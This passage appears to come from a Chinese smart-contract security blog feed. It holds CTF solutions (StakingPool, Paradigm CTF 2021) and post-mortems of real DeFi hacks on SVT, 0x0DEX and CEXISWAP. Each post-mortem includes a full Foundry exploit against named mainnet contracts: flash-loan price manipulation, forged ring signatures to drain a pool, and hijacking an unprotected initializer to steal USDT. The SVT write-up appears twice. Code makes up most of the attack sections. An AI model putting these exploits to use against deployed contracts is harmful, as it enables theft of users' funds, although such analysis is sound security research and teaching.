0xf0000000) &gt;&gt; 28;        timestampElements[1] = (block.timestamp &amp; 0xf000000) &gt;&gt; 24;        timestampElements[2] = (block.timestamp &amp; 0xf00000) &gt;&gt; 20;        timestampElements[3] = (block.timestamp &amp; 0xf0000) &gt;&gt; 16;        timestampElements[4] = (block.timestamp &amp; 0xf000) &gt;&gt; 12;        timestampElements[5] = (block.timestamp &amp; 0xf00) &gt;&gt; 8;        timestampElements[6] = (block.timestamp &amp; 0xf0) &gt;&gt; 4;        timestampElements[7] = (block.timestamp &amp; 0xf) &gt;&gt; 0;        timestampElements = bubbleSort(timestampElements);        for (uint256 i; i &lt; timestampElements.length; i++) {            sortedTimestamp = timestampElements[i] &lt;&lt; 32 * i;        }    }        function bubbleSort(uint256[] memory arr) private pure returns (uint256[] memory) {        for (uint256 i = 0; i &lt; 8; i++) {            for (uint256 j = i + 1; j &lt; 8; j++) {                if (arr[i] &gt; arr[j]) {                    uint256 tmp = arr[i];                    arr[i] = arr[j];                    arr[j] = tmp;                }            }        }        return arr;    }}</code></pre><h1 id="StakingPool"><a href="#StakingPool" class="headerlink" title="StakingPool"></a>StakingPool</h1><h2 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a>目标</h2><p>要求我们的账户rewardToken余额为 1e8 * 1e18，rewardToken2余额大于 1e8 * 1e18。</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>以共有3种token，其中stakedToken、rewardToken为标准的ERC20，rewardToken2<br>为ERC20V2，通过审查不难发现调ERC20V2的_transfer()方法时，当from=to时，from会凭空产生token。</p><p>再看StakingPool，在调合约的withdraw()和deposit()方法时，会自动领取奖励，因为这样可以保证上次领取的时间到这次领取(存款改变前)、以及下次领取和这次领取(存款改变后)的用户存款量是一致的。但是合约中的transfer()方法将这种设计破坏了。</p><h2 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h2><pre><code>pragma solidity ^0.8.0;import {Test} from "forge-std/Test.sol";import {StakingPools, StakingPoolsDeployment, ERC20} from "../src/StakingPool/StakingPoolsDeployment.sol";contract StakingPoolTest is Test {    StakingPoolsDeployment private deployer;    function setUp() external {        deployer = new StakingPoolsDeployment();        deployer.faucet();    }    function test_hackStakingPool() external {        solveStageA();        solveStageB();        assertTrue(deployer.isSolved());    }    function solveStageA() private {        StakingPools pool = deployer.stakingPools();        uint256 amount = 1;        pool.stakedToken().approve(address(pool), amount);        pool.deposit(amount);        vm.roll(pool.stakingEndBlock());        address secondAddress = address(0xdeadbeef);         ERC20 token = deployer.rewardToken();        while (token.balanceOf(address(pool)) != 0) {            pool.withdraw(0);            pool.transfer(secondAddress, amount);            pool.emergencyWithdraw();            vm.prank(secondAddress);            pool.transfer(address(this), amount);        }    }    function solveStageB() private {        ERC20 token = deployer.rewardToken2();        while (!deployer.stageB()) {            uint256 balance = token.balanceOf(address(this));            token.transfer(address(this), balance);        }    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20230826 SVT</title>
      <link href="/2023/09/26/20230826-SVT/"/>
      <url>/2023/09/26/20230826-SVT/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>BSC $STV 受到攻击，损失超过$ 500K。</p><h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们通过<a href="https://explorer.phalcon.xyz/tx/bsc/0xf2a0c957fef493af44f55b201fbc6d82db2e4a045c5c856bfe3d8cb80fa30c12">phalcon</a>来分析。</p><p>我们通过调用栈发现，攻击者通过DPPOracle闪贷后，不断买卖STV Token，从而获利。</p><p>由于代码未开源，我只能猜测可能是代币的价格计算有缺陷而导致的价格被操纵。</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.10;import "forge-std/Test.sol";import "./interface.sol";interface ISVTpool {    function buy(uint256 amount) external;    function sell(uint256 amount) external;}contract ContractTest is DSTest {    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);    IERC20 SVT = IERC20(0x657334B4FF7bDC4143941B1F94301f37659c6281);    ISVTpool pool = ISVTpool(0x2120F8F305347b6aA5E5dBB347230a8234EB3379);    address dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);    function setUp() public {        cheats.createSelectFork("bsc", 31178238 -1);    }    function testExploit() public {        BUSD.approve(address(pool), type(uint256).max);        SVT.approve(address(pool), type(uint256).max);        uint256 flash_amount = BUSD.balanceOf(dodo);        DVM(dodo).flashLoan(0, flash_amount, address(this), new bytes(1));        emit log_named_decimal_uint("[End] Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), 18);    }    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {        // Buy SVT with BUSD        uint256 amount = BUSD.balanceOf(address(this));        pool.buy(amount/2);        uint256 svtBalance1 = SVT.balanceOf(address(this));        pool.buy(amount - amount/2);        uint256 svtBalance2 = SVT.balanceOf(address(this)) - svtBalance1;        console2.log(svtBalance2);        console2.log(svtBalance1);        // Sell SVT for BUSD        pool.sell(svtBalance2);        pool.sell(SVT.balanceOf(address(this)) * 62 / 100);                BUSD.transfer(dodo, quoteAmount);                    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 攻击事件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻击事件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20230826 SVT</title>
      <link href="/2023/09/26/20230908-APIG/"/>
      <url>/2023/09/26/20230908-APIG/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>BSC$STV 受到攻击。损失超过$ 500K。攻击者发起了多次攻击，以其中一次为例。</p><p>TX：0xf2a0c957fef493af44f55b201fbc6d82db2e4a045c5c856bfe3d8cb80fa30c12</p><h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们用<a href="0xf2a0c957fef493af44f55b201fbc6d82db2e4a045c5c856bfe3d8cb80fa30c12">phalcon</a>来分析。</p><p>通过phalcon的调用栈我们发现攻击者不断的买卖STV来获取利润。</p><p>由于STV的代码未开源，我只能猜测可能是价格计算有缺陷而导致的价格操纵案例。</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.10;import "forge-std/Test.sol";import "./interface.sol";interface ISVTpool {    function buy(uint256 amount) external;    function sell(uint256 amount) external;}contract ContractTest is DSTest {    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);    IERC20 SVT = IERC20(0x657334B4FF7bDC4143941B1F94301f37659c6281);    ISVTpool pool = ISVTpool(0x2120F8F305347b6aA5E5dBB347230a8234EB3379);    address dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);    function setUp() public {        cheats.createSelectFork("bsc", 31178238 -1);    }    function testExploit() public {        BUSD.approve(address(pool), type(uint256).max);        SVT.approve(address(pool), type(uint256).max);        uint256 flash_amount = BUSD.balanceOf(dodo);        DVM(dodo).flashLoan(0, flash_amount, address(this), new bytes(1));        emit log_named_decimal_uint("[End] Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), 18);    }    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {        // Buy SVT with BUSD        uint256 amount = BUSD.balanceOf(address(this));        pool.buy(amount/2);        uint256 svtBalance1 = SVT.balanceOf(address(this));        pool.buy(amount - amount/2);        uint256 svtBalance2 = SVT.balanceOf(address(this)) - svtBalance1;        console2.log(svtBalance2);        console2.log(svtBalance1);        // Sell SVT for BUSD        pool.sell(svtBalance2);        pool.sell(SVT.balanceOf(address(this)) * 62 / 100);                BUSD.transfer(dodo, quoteAmount);                    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20230911 0x0DEX</title>
      <link href="/2023/09/25/20230911-0x0DEX/"/>
      <url>/2023/09/25/20230911-0x0DEX/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>OxODexPool合约中的swapOnWithdrawal()方法被黑客利用，导致被盗取39.9964Ether(约$61K)。<br>0x0DEX通过deposit()和withdraw()方法使用户能够私下转移资金。0x0DEX后来引入了swapOnWithdrawal()方法，它通过允许用户私下交换他们的存款资金（ETH）来扩展协议的功能。这个交换取款功能被利用了。</p><p>TX：0x00b375f8e90fc54c1345b33c686977ebec26877e2c8cac165429927a6c9bdbec</p><h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们通过<a href="https://explorer.phalcon.xyz/tx/eth/0x00b375f8e90fc54c1345b33c686977ebec26877e2c8cac165429927a6c9bdbec">phalcon</a>来分析。</p><p>通过phalcon我们很容易发现怪异之处，当攻击者存入10Ether后通过swapOnWithdrawal()取出了价值9.97Ehter的USDC，然后攻击者又存入了0.1Ether，但依然能取出价值9.97Ether的USDC。很明显漏洞就在swapOnWithdrawal()中。</p><pre><code>    function swapOnWithdrawal(        address tokenOut,        address payable recipient,        uint256 relayerGasCharge,         uint256 amountOut,        uint256 deadline,        WithdrawalData memory withdrawalData    ) external {        require(recipient != address(0), "ZERO_ADDRESS");        withdraw(            recipient,             withdrawalData,            relayerGasCharge        );        uint amountIn = _lastWithdrawal;        uint relayerFee = getRelayerFeeForAmount(amountIn);        address payable relayerAddress = IOxODexFactory(factory).relayerAddress();        (bool sent, ) = relayerAddress.call{value: relayerFee}("");        require(sent, "FAILED_TO_SEND_RELAYER_FEE");        amountIn -= relayerFee;</code></pre><p>通过代码我们能发现发给我们的 amountIn = _lastWithdrawal - relayerFee。_lastWithdrawal在withdraw中被赋值。</p><pre><code>if(withdrawalData.wType == Types.WithdrawalType.Direct){            _sendFundsWithRelayerFee(withdrawalData.amount - relayerGasCharge, recipient);        }else{            _lastWithdrawal = withdrawalData.amount - relayerGasCharge;        }</code></pre><p>很明显_lastWithdrawal并不会再每提款时更新，只在使用WithdrawalType.Swap时更新。思路已经明了。</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>// SPDX-License-Identifier: SEE LICENSE IN LICENSEpragma solidity  ^0.8.10;import "forge-std/Test.sol";import "./interface.sol";// Attacker : https://etherscan.io/address/0xcf28e9b8aa557616bc24cc9557ffa7fa2c013d53// Attacker Contract : https://etherscan.io/address/0xc44ea7650b27f83a6b310a8fed9e9daf2864a65b// Vulnerable Contract : https://etherscan.io/address/0x29d2bcf0d70f95ce16697e645e2b76d218d66109// Tx : 0x00b375f8e90fc54c1345b33c686977ebec26877e2c8cac165429927a6c9bdbeclibrary Types {    enum WithdrawalType {        Direct,        Swap    }}struct WithdrawalData {    uint256 amount;    uint256 ringIndex;    uint256 c0;    uint256[2] keyImage;    uint256[] s;    Types.WithdrawalType wType;}interface IOxODexPool {    function deposit(        uint256 _amount,        uint256[4] memory _publicKey    ) external payable;    function withdraw(        address payable recipient,        WithdrawalData memory withdrawalData,        uint256 relayerGasCharge    ) external;    function swapOnWithdrawal(        address tokenOut,        address payable recipient,        uint256 relayerGasCharge,        uint256 amountOut,        uint256 deadline,        WithdrawalData memory withdrawalData    ) external;    function getCurrentRingIndex(        uint256 amountToken    ) external view returns (uint256);    function getRingHash(        uint256 _amountToken,        uint256 _ringIndex    ) external view returns (bytes32);}contract ContractTest is Test {    IOxODexPool private constant OxODexPool = IOxODexPool(0x3d18AD735f949fEbD59BBfcB5864ee0157607616);    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);    IBalancerVault private constant BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);    Uni_Router_V2 private constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);    uint256 private constant Bx = 1368015179489954701390400359078579693043519447331113978918064868415326638035;    uint256 private constant By = 9918110051302171585080402603319702774565515993150576347155970296011118125764;    uint256 private constant Hx = 2286484483920925456308759965850684826720807236777393886284879343816677643124;    uint256 private constant Hy = 1804024400776434902361310543986557260474938171670710692674407862657333646188;    uint256 private constant curveN = 0x30644e72e131a029b85045b68181585d2833e84879b9709143e1f593f0000001;    function setUp() public {        vm.createSelectFork("mainnet", 18115707);        vm.label(address(OxODexPool), "OxODexPool");        vm.label(address(WETH), "WETH");        vm.label(address(USDC), "USDC");        vm.label(address(BalancerVault), "BalancerVault");        vm.label(address(Router), "Router");    }    function testExploit() public {        deal(address(this), 0 ether);        uint256 loan = 11 ether;        address[] memory tokens = new address[](1);        tokens[0] = address(WETH);        uint256[] memory amounts = new uint256[](1);        amounts[0] = loan;        BalancerVault.flashLoan(address(this), tokens, amounts, "");        emit log_named_decimal_uint(            "Attacker ETH balance after exploit",            address(this).balance,            18        );    }    function receiveFlashLoan(        address[] memory,        uint256[] memory amounts,        uint256[] memory fees,        bytes memory    ) external payable {                WETH.withdraw(amounts[0]);        exploit();        USDC.approve(address(Router), type(uint256).max);        address[] memory path = new address[](2);        path[0] = address(USDC);        path[1] = address(WETH);        Router.swapExactTokensForETH(            USDC.balanceOf(address(this)),            0,            path,            address(this),            block.timestamp        );        WETH.deposit{value: amounts[0] + fees[0]}();        WETH.transfer(address(BalancerVault), amounts[0] + fees[0]);    }    function exploit() internal {                uint256 poolETHBalance = address(OxODexPool).balance;        poolETHBalance =            10 ether -            (poolETHBalance - (poolETHBalance / 10 ether) * 10 ether);        new ForceSend{value: poolETHBalance}();        WithdrawalData memory w;                uint256 ringIndex = deposit(10 ether);        w = withdrawData(address(this), 10 ether, ringIndex);        w.wType = Types.WithdrawalType.Swap;        OxODexPool.swapOnWithdrawal(            address(USDC),            payable(address(this)),            0,            0,            block.timestamp,            w        );        while (address(OxODexPool).balance &gt;= 10 ether) {            ringIndex = deposit(0.1 ether);            w = withdrawData(address(this), 0.1 ether, ringIndex);                        OxODexPool.swapOnWithdrawal(                address(USDC),                payable(address(this)),                0,                0,                block.timestamp,                w            );        }    }    function addFee(uint256 realAmount) internal pure returns (uint256 total) {        total = realAmount + (realAmount * 9) / 1000;    }    function deposit(uint256 amount) internal returns (uint256 ringIndex) {               uint256[4] memory pks = [0x1, 0x2, Bx, By];        ringIndex = OxODexPool.getCurrentRingIndex(amount);        OxODexPool.deposit{value: addFee(amount)}(amount, pks);    }    function withdrawData(        address recv,         uint256 amount,        uint256 ringIndex    ) internal view returns (WithdrawalData memory w) {        bytes32 ringHash = OxODexPool.getRingHash(amount, ringIndex);        uint256[2] memory c;        uint256[2] memory s;        (c, s) = generateSignature(ringHash, recv);        w.amount = amount;        w.ringIndex = ringIndex;        w.c0 = c[0];        w.keyImage = [Hx, Hy];        w.s = new uint256[](2);        w.s[0] = s[0];        w.s[1] = s[1];           }       function generateSignature(        bytes32 ringHash,        address recv    ) public view returns (uint256[2] memory c, uint256[2] memory s) {        uint256[2] memory G;        uint256[2] memory H;        uint256[2] memory B;        G[0] = 0x1;        G[1] = 0x2;        H[0] = Hx;        H[1] = Hy;        B[0] = Bx;        B[1] = By;              c[1] = createHash(ringHash, recv, G, H);              s[1] = 1;        c[0] = createHash(            ringHash,            recv,            ecAdd(G, ecMul(B, c[1])),            ecMul(H, c[1] + 1)        );               s[0] = curveN + 1 - c[0];    }        function ecAdd(        uint256[2] memory p,        uint256[2] memory q    ) internal view returns (uint256[2] memory r) {        assembly {                        let fp := mload(0x40)            mstore(fp, mload(p))            mstore(add(fp, 0x20), mload(add(p, 0x20)))            mstore(add(fp, 0x40), mload(q))            mstore(add(fp, 0x60), mload(add(q, 0x20)))            pop(staticcall(gas(), 0x06, fp, 0x80, r, 0x40))        }    }        function ecMul(        uint256[2] memory p,        uint256 k    ) internal view returns (uint256[2] memory kP) {        assembly {            let fp := mload(0x40)            mstore(fp, mload(p))            mstore(add(fp, 0x20), mload(add(p, 0x20)))            mstore(add(fp, 0x40), k)            pop(staticcall(gas(), 0x07, fp, 0x60, kP, 0x40))        }    }    function createHash(        bytes32 ringHash,        address recv,        uint256[2] memory p1,        uint256[2] memory p2    ) internal pure returns (uint256 hash) {                assembly {            let fp := mload(0x40)            mstore(fp, 0x1)            mstore(add(fp, 0x20), 0x2)            mstore(add(fp, 0x40), Bx)            mstore(add(fp, 0x60), By)            mstore(add(fp, 0x80), Hx)            mstore(add(fp, 0xa0), Hy)            mstore(add(fp, 0xd4), recv)            mstore(add(fp, 0xc0), ringHash)                        mstore(add(fp, 0xf4), mload(p1))            mstore(add(fp, 0x114), mload(add(p1, 0x20)))            mstore(add(fp, 0x134), mload(p2))            mstore(add(fp, 0x154), mload(add(p2, 0x20)))            hash := mod(keccak256(fp, 0x174), curveN)        }    }    receive() external payable {}}contract ForceSend {    IOxODexPool private constant OxODexPool =        IOxODexPool(0x3d18AD735f949fEbD59BBfcB5864ee0157607616);    constructor() payable {        selfdestruct(payable(address(OxODexPool)));    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20230921 CEXISWAP</title>
      <link href="/2023/09/24/20230921-CEXISWAP/"/>
      <url>/2023/09/24/20230921-CEXISWAP/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>cexiswap被黑客攻击，黑客从中盗取了3w的USDT。（CEXISWAP是一个去中心化的多链交易所，通过贸易管道技术在DEX和CEX之间桥接流动性）</p><p>TX：0xede72a74d8398875b42d92c550539d72c830d3c3271a7641ee1843dc105de59e</p><h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们通过<a href="https://explorer.phalcon.xyz/tx/eth/0xede72a74d8398875b42d92c550539d72c830d3c3271a7641ee1843dc105de59e">phalcon</a>来看。攻击合约直接调用受害者的initialize()，使自己成为了admin，再调用受害者的upgradeToAndCall()，再upgradeToAndCall()中受害者再次delegatecall攻击合约的0x1de24bbf函数。</p><p>很明显，受害者为对initialize()进行访问限制，导致被攻击。</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>//SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.10;import"forge-std/Test.sol";import"./interface.sol";// Attacker : https://etherscan.io/address/0x060c169c4517d52c4be9a1dd53e41a3328d16f04// Attack Contract : https://etherscan.io/address/0x8c425ee62d18b65cc975767c27c42de548d133a1// Vulnerable Contract : https://etherscan.io/address/0xb8a5890d53df78dee6182a6c0968696e827e3305// Attack Tx : 0xede72a74d8398875b42d92c550539d72c830d3c3271a7641ee1843dc105de59einterface ICEXISWAP {    function initialize(        string memory name,        string memory ticker,        address _treasuryWallet,        address _communityWallet,        address _admin,        address _strategy    ) external;    function upgradeToAndCall(        address newImplementation,        bytes memory data    ) external payable;}contract CEXISWAPTest is Test{    ICEXISWAP constant cexiswap = ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);    IUSDT constant usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);    Exploiter public exploiter;    function setUp() public{        vm.createSelectFork("mainnet", 18182605);        vm.label(address(cexiswap), "CEXISWAP");        vm.label(address(usdt), "USDT");    }    function testexploit() public{        exploiter = new Exploiter();        exploiter.exploit();    }}contract Exploiter{    ICEXISWAP constant cexiswap = ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);    IUSDT constant usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);    bytes32 constant solt = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;    address owner;    function exploit() public{        cexiswap.initialize(            "HAX",            "HAX",            address(this),            address(this),            address(this),            address(this));                cexiswap.upgradeToAndCall( address(this),abi.encodePacked(this.exploit2.selector));        this.killMe();    }    function exploit2() public{        owner = address(this);                usdt.transfer(owner, usdt.balanceOf(address(this)));    }      function upgradeTo(address newImplementation) external {        bytes32 _slot = solt;        assembly {            sstore(_slot, newImplementation)        }    }     function killMe() public{        selfdestruct(payable(msg.sender));    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Paradigm CTF 2021</title>
      <link href="/2023/09/10/Paradigm-CTF-2021/"/>
      <url>/2023/09/10/Paradigm-CTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="hellow"><a href="#hellow" class="headerlink" title="hellow"></a>hellow</h2><p>签个到而已，就不多说了。</p><h2 id="secure"><a href="#secure" class="headerlink" title="secure"></a>secure</h2><p>这题要求setup合约里有50个WETH即可。</p><p>这很简单，因为我们有5000ETH，只要存50个ETH，再把WETH发给setup合约即可。</p><pre><code>function attack() public payable {    setup.WETH().deposit.value(msg.value)();    setup.WETH().transfer(address(setup), setup.WANT());}</code></pre><h2 id="broker"><a href="#broker" class="headerlink" title="broker"></a>broker</h2><p>这题要求，我们让Broker合约的WETH的余额下于5个。</p><p>broker合约是一个贷款合约，质押WETH去贷款AMT。众所周知使用Uniswap的现货价格为预言机是不明智的，因为它容易被操控。</p><pre><code>function attack() public payable {  weth.deposit{value: msg.value}(); //使WETH/AWT变大。  weth.transfer(address(pair), weth.balanceOf(address(this)));  bytes memory data;  pair.swap(450_000 * 1 ether, 0, address(this), data);  uint256 rate = broker.rate();  token.approve(address(broker), type(uint256).max);   uint256 liqAmount = 21 ether * rate;  broker.liquidate(address(setup), liqAmount);}</code></pre><h2 id="BabySandbox"><a href="#BabySandbox" class="headerlink" title="BabySandbox"></a>BabySandbox</h2><pre><code>  function isSolved() public view returns (bool) {        uint size;        assembly {            size := extcodesize(sload(sandbox.slot))        }        return size == 0;    }</code></pre><p>想要达到此条件，我能能想到的只有sandbox合约自毁。(因为合约中有delegatecall)</p><p>调用流程</p><pre><code>Attack.attck()    -&gt;babysandbox.run(code)        -&gt;babysandbox.staticcall(address(this))            -&gt;babysandbox.run(code)                -&gt;babysandbox.delegatecall(code)                    -&gt;code.fallback()                        return /因为staticcall里不能改变状态，只能return        -&gt;babysandbox.call(address(this))            -&gt;babysandbox.run(code)                -&gt;babysandbox.delegatecall(code)                    -&gt;code.fallback()                        selfdestruct </code></pre><p>现在的关键是如何判断我们应该处于staticcall中还是call中。</p><p>我想的是用以个计数器来判断，但似乎不行，因为staticcall中不允许修改状态。</p><p>然后我看见一位大佬，用try caught来判断，十分巧妙。</p><p>原理是如果CALL的过程中，遇到了recert()，交易不会全部回滚，而是返回0。如果CALL远程地址成功，返回1。</p><p>这是他的code：</p><pre><code>pragma solidity 0.7.0;contract Receiver {  fallback() external {    assembly {      switch call(gas(), 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512, 0x00, 0x00, 0x00, 0x00, 0x00)       // 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 为Dummy合约地址        case 0 {          return(0x00, 0x00)        }        case 1 {          selfdestruct(0)        }    }  }}contract Dummy {  fallback() external {    selfdestruct(address(0));  }}</code></pre><h2 id="Bouncer"><a href="#Bouncer" class="headerlink" title="Bouncer"></a>Bouncer</h2><p>众所周知当我们使用msg.value时一定要避免被循环调用。</p><p>很遗憾，此合约并没有做到。它提供了convertMany()去循环调用convert()。导致我们付一次款能被多次计算。</p><pre><code>function attack() public payable {    uint256 bouncerBalance = address(bouncer).balance;    uint256 _amount = bouncerBalance + 2 * 1 ether;    bouncer.enter{value: 1 ether}(ETH, _amount);    bouncer.enter{value: 1 ether}(ETH, _amount);    withdrawalAmount = _amount;}function attack2() public payable {    uint256[] memory arr = new uint256[](2);    for (uint256 i = 0; i &lt; arr.length; i++) {      arr[i] = i;    }    bouncer.convertMany{value: withdrawalAmount}(address(this), arr);    bouncer.redeem(ERC20Like(ETH), withdrawalAmount *arr.length);}</code></pre><h2 id="Farmer"><a href="#Farmer" class="headerlink" title="Farmer"></a>Farmer</h2><p>可以看到题目要求我们让farmer在交易后的实际资产少于期待资产，也就是亏钱。</p><p>题中的2个合约想要同过Uniswap的Comp-&gt;WETH-&gt;DAI流程出售代币来套利。</p><p>现然我们可以在调用recycle()套利前，通过拔高WETH的价格或DAI的价格，来使farmer亏损。</p><pre><code>function attack() external payable {  WETH.deposit{value: msg.value}();  WETH.approve(address(ROUTER), type(uint256).max);  address[] memory path = new address[](2);  path[0] = address(WETH);  path[1] = address(DAI);  uint256 amount = WETH.balanceOf(address(this));  ROUTER.swapExactTokensForTokens(      amount,      0,      path,      address(this),      block.timestamp  );  farmer.claim();  farmer.recycle();}</code></pre><h2 id="Yield-Aggregator"><a href="#Yield-Aggregator" class="headerlink" title="Yield Aggregator"></a>Yield Aggregator</h2><p>这题要求我们窃取受害者存入bank中的50WETH。</p><p>我们很容易发现deposit()有很大的漏洞，因为它并未对传入的protocol和tokens审查。我们可以在protocol和tokens中做手脚，所以也有2种解法。</p><p>第一种</p><p>由于未对protocol审查，加上poolTokens未区分每个protocol。导致我们可以在A银行存款，但在B银行取款。</p><pre><code>pragma solidity 0.8.0;import "./setup.sol";contract Attack {    WETH9 constant weth = WETH9(0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8);     YieldAggregator public aggregator;    MiniBank public bankA;    MiniBank public bankB;    constructor(address _bankA, address _aggregator) payable {       bankA = MiniBank(_bankA);       bankB = new MiniBank();       aggregator = YieldAggregator(_aggregator);        weth.deposit{value: msg.value}();        weth.approve(_aggregator, type(uint256).max);    }    function attack () public {        address[] memory _tokens = new address[](1);        _tokens[0] = address(weth);        uint256[] memory _amounts = new uint256[](1);        _amounts[0] = 50 gwei;        aggregator.deposit(Protocol(address(bankB)), _tokens, _amounts);        aggregator.withdraw(Protocol(bankA), _tokens, _amounts);    }}</code></pre><p>第二种</p><p>由于未审查tokens，因此我们可以传入被我们控制的tokens，然后恶意的构造transferFrom，实施重入。</p><pre><code>pragma solidity ^0.8.0;import "./setup.sol";contract Attack {    Setup public setup;    YieldAggregator public aggregator;    MiniBank public bank;    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);    constructor(address _setup, address _aggregator, address _bank) payable {        setup = Setup(_setup);        aggregator = YieldAggregator(_aggregator);        bank = MiniBank(_bank);        weth.deposit{value: msg.value}();        weth.approve(address(aggregator), type(uint256).max);        weth.approve(address(bank), type(uint256).max);    }    function attack() public {        address[] memory _tokens = new address[](1);        _tokens[0] = address(this);        uint256[] memory _amounts = new uint256[](1);        _amounts[0] = 1;        aggregator.deposit(bank, _tokens, _amounts);        _tokens[0] = address(weth);        _amounts[0] = 100 ether;        aggregator.withdraw(bank, _tokens, _amounts);    }    function transferFrom(        address src,        address dst,        uint256 qty    ) external returns (bool) {        address[] memory _tokens = new address[](1);        _tokens[0] = address(weth);        uint256[] memory _amounts = new uint256[](1);        _amounts[0] = 50 ether;        aggregator.deposit(bank, _tokens, _amounts);    }    function approve(        address dst,        uint256 qty    ) external returns (bool) {        return true;    }    function balanceUnderlying() public view returns (uint256) {        return 0;    }}</code></pre><h2 id="Market"><a href="#Market" class="headerlink" title="Market"></a>Market</h2><p>本题要求我们窃取market的eth，market是一个有铸造自定义代币，出售，购买功能的合约。</p><p>CryptoCollectible合约只有实现了transfer的逻辑，状态的改变在EternalStorage合约中进行。</p><p>开始时我发现合约版本较低，所以我尝试寻找与溢出有关的漏洞，但这条路似乎不通。</p><p>最后我将目光放在ternalStorage合约中，它用汇编实现了一个数据结构</p><pre><code>struct TokenInfo {    bytes32 displayName; //slot0    address owner; //slot1    address approved;//slot2    address metadata;//slot3}mapping(bytes32 =&gt; TokenInfo) tokens;</code></pre><p>在ternalStorage合约中提供了很多的方法让我们去改slot，在这么多方法中，我盯上了</p><pre><code>case 0xa9fde064 { // updateName(bytes32,bytes32)      let tokenId := calldataload(0x04)      let newName := calldataload(0x24)                          ensureTokenOwner(tokenId)      sstore(tokenId, newName)}</code></pre><p>当我的metadata为owner时我们可以修改approved并且能通过ensureTokenOwner(tokenId)的检测。</p><pre><code>pragma solidity ^0.7.0;import "./setup.sol";contract Attack {    CryptoCollectiblesMarket public market;    EternalStorage public eternalStorage;    constructor(address _market, address _eternalStorage) {      market = CryptoCollectiblesMarket(_market);      eternalStorage = EternalStorage(eternalStorage);    }         function attack() public payable {            bytes32 tokenId = market.mintCollectibleFor{value: 70 ether}(address(this));      token.approve(tokenId, address(market));      eternalStorage.updateMetadata(tokenId, address(this));      market.sellCollectible(tokenId);      //回收Token       TakeBack(tokenId);      //补齐eth      complete(70 ether);      market.sellCollectible(tokenId);    }    function TakeBack(bytes32 tokenId1) public {        bytes32 TokenId2 = bytes32(uint256(tokenId1) + 2);        eternalStorage.updateName(            TokenId2,            bytes32(uint256(address(this)))        );        token.transferFrom(tokenId, address(market), address(this));        token.approve(tokenId, address(market));    }    function Complete(uint256 sentAmount) public {               uint256 tokenPrice = (sentAmount * 10000) / (10000 + 1000);        uint256 price = tokenPrice - address(market).balance;               market.mintCollectible{value: price}();    }    receive() external payable {}}</code></pre><h2 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h2><p>本题要求我们窃取bank中的WETH。</p><p>当我看见这是个低版本合约是，我第一时间想到的是溢出漏洞。然后我的思路是通过 accounts[msg.sender].length–，使其下溢，然后利用setAccountName(uint accountId, 